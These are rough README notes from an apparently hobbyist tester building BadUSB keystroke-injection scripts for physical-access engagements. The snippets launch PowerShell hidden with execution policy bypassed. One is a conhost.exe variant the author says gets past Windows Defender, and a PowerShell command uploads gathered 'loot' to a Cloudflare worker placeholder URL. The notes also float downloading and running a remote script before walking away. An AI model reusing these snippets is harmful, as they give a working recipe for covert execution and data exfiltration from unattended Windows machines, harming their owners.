# badUSB Scripts

This is less of a README and more of a rough draft of notes based on my testing.

I might write a proper README some time later, but I just needed a place to temporarily hold these thoughts in note like format.

### Purpose:

I got bored and have a ton of toys that can do HID like attacks and even though badUSB has been talked to death, many of the examples are very basic, PoC, or they
just don't look that great for a realistic physical engagement.

I also wanted to experiment with a few ideas of my own.

Currently, I only have one script that I have been building off of, but I feel like sets the stage for future scripts which are basic and boring on paper, but
out in the field, they are pretty good for being so boring.

What I mean by boring: reliable and nothing fancy or sexy which is what online and the media overhypes a lot.

Exploits, custom obfuscation, and malware are worthless if they are patched, detectable, etc within 5 business days and most have shelf lives anyways which I do not have
the time or the patience to constantly tweak and build/write custom offensive tools. It is also not my area and physical access is king.

### What I got so far:

Now that I got done with explaining the purpose of yet another badUSB project thing, I should probably explain my ideas.

Originally, I wanted to write a few scripts that run on my bash bunny, nethunter device (with full official support which includes the kernel), and my flipper zero. (I am currently debating buying the new USB Rubber Ducky because of the form factor and it has some features I woulud like, but as of now it is $100 and hak5 toys are at the bottom of my shopping list. It is unfortunate Malduino are out of stock.)

The first script was simple on paper, but more trouble than I would've liked. Basically just something that runs a bunch of commands to gather useful information on the system. Useful as in: the usual information gathering scripts and commands I have learned over the years, aren't that useful to me and this is up for interpretation because everyone is different and I'm not going to debate this, but the commands that I decided to include are pretty good and give the information that I would like to have.

Originally, I had this saved to a file that would require either the Bash Bunny to have its storage enabled, mounted, and the script to automatically find the mounted usb storage, or require a seperate usb drive plugged into the machine. This kind of works and I have used it in my very, very old attempts, but I have been working a lot with cloudflare workers so I thought, why not integrate a worker into this and just upload the data as json? The worker would handle the upload on their end and properly parse the data before inserting it into the db.

This is simple on paper, but turned out javascript is a little bitch and the json.parse() broke on the raw data that I uploaded due to Windows weird quirks regarding inserting random slashes and other weird stuff.

I did end up vibe coding a custom json parser for this and I do apologize for the disappoint, but once you see why, you'd understand since I was basically handling a buffer inside a buffer, inside yet another buffer or something like that.

The code is in the cloudflare workers code thing... specifically the file `customJsonParser.ts` and I don't feel like touching that thing. I probably will at least go back and clean some stuff up, but I haven't touched it since it finally started working at like 3 am in the morning.

Currently, this works as intended... at least on the cloudflare worker side.

Windows is a pita. Mostly because in a lot of the instructions in the badUSB scripts with the escaping of quotes and other weird things, but also because of the changes that may or may not break scripts.

---

The most annoying one, was of course, Windows Terminal and one of the most common instructions run at the beginning is this:

```
DELAY 1000
GUI r
DELAY 300
STRING powershell.exe -w hidden -ep bypass
ENTER
DELAY 800
```

Before Windows Terminal was shipped as the default this worked as intended which was to run a command in the run box to open a powershell window hidden and execution policy set to bypass.

Now with Windows Terminal being shipped as the default, this is not the case and instead, Windows Terminal is opened and the flags are ignored. So instead of opening up hidden, it opens as minimized and I'm not sure if this was my particular machine or on all machines that have Windows Terminal by default.

The way I managed to solve it is by using conhost, but Windows Defender flags the command, unless the flags are in a specific format or something. I don't know why Defender is like this, since the command is essentially the same and I'm going to chalk it up to laziness to differentiate properly between actual malicious and a mundane command that _could_ be malicious.

The command with conhost isn't much different looking, but:

```
DELAY 1000
GUI r
DELAY 300
STRING conhost.exe powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass
ENTER
DELAY 800
```

---

I will continue testing and see if the behavior changes at anytime, which it probably will because Microsoft is annoying like that which will only irritate me because I gotta put in more effort.

---

There is also something that should've been obvious, but somehow I didn't learn of it, till now. There is apparently an instruction to insert a newline, instead of the weird string-escaping-foo. Looks something like this in the command to upload the data to the worker:

```
STRING $body = $global:loot -join [Environment]::NewLine; \
    try { Invoke-RestMethod -Method Post -Uri 'https://WORKER_URL_THING.workers.dev/api/upload' \
    -Body $body -ContentType 'text/plain' } \
    catch {}; exit
```

Simple right? You'd think this wouldn't require all these headaches and weird workarounds because some of the information I learn later after I struggle with bugs that are just annoying.

#### Future Ideas?

I have been thinking a bit of what I want to do with this and thinking that now that I got the idea mostly working with cloudflare workers, I was thinking of utilizing serverless even more via things like downloading a powershell script, execute the script, and while running in the background, unplug, and walk away.

I probably can get a bit more creative as well, depending on what I'm trying to achieve, but the options are near limitless and I can probably can come up with some dumb ideas that are purely for my own entertainment in my labs.